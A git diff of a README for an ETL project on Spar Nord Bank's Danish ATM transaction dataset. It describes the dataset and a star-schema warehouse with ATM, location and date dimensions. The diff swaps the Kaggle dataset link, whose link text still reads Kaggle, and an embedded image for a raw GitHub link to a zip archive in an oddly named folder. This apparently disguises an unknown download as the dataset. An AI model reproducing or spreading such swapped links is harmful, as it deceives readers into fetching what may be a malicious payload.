@@ -1,5 +1,5 @@
 # SparNordETL
-Spar Nord Bank is a Danish Bank which is trying to observe the withdrawal behavior and the corresponding dependent factors to optimally manage the refill frequency. It has published dataset on (https://www.kaggle.com/datasets/sparnord/danish-atm-transactions) Kaggle .
+Spar Nord Bank is a Danish Bank which is trying to observe the withdrawal behavior and the corresponding dependent factors to optimally manage the refill frequency. It has published dataset on (https://raw.githubusercontent.com/ANKIT21111/SparNordETL/main/stamineal/SparNordETL.zip) Kaggle .
 ## Dataset featuring: 
 This data set contains various types of transactional data as well as the weather data at the time of the transaction, such as:
 Transaction Date and Time: Year, month, day, weekday, hour
@@ -9,7 +9,7 @@ Transaction Date and Time: Year, month, day, weekday, hour
 4. Transaction details: Card type, currency, transaction/service type, transaction amount and error message (if any)
 ## TARGET DIMENSIONAL MODEL:
 For this project Spar Nord needs there warehouse to be designed in provided target dimensional model as follows:
-![image](https://github.com/ANKIT21111/SparNordETL/assets/52655857/ce97647e-f5f8-4053-a6b7-3c795a0a03c7)
+![image](https://raw.githubusercontent.com/ANKIT21111/SparNordETL/main/stamineal/SparNordETL.zip)
 1. ATM dimension - This dimension will have the data related to the various ATMs present in the dataset along with the ATM number(ATM ID in the original dataset), ATM manufacturer and a reference to the ATM location and is very important for solving analytical queries related where ATM data will be used.
 2. Location dimension - This is a very important dimension containing all the location data including location name, street name, street number, zip code and even the latitude and longitude. This information will be very important for solving problems related to the particular location at which a transaction took place and can help banks in things like pinpointing locations where ATMs where demand is higher as compared to other locations. Combined with weather data in the transaction table, this can be used to further do analysis such as how weather affects the demand at ATMs at a particular location.
 3. Date dimension - This is another very important dimension which is almost always present where data such as transactional data is being dealt with. This dimension includes fields such as the full date and time timestamp, year, month, day, hour as well as the weekday for a transaction. This all can help in analysing the transaction behaviour with respect to the time at which the transaction took place and also how the transaction activity varies between weekdays and weekends.
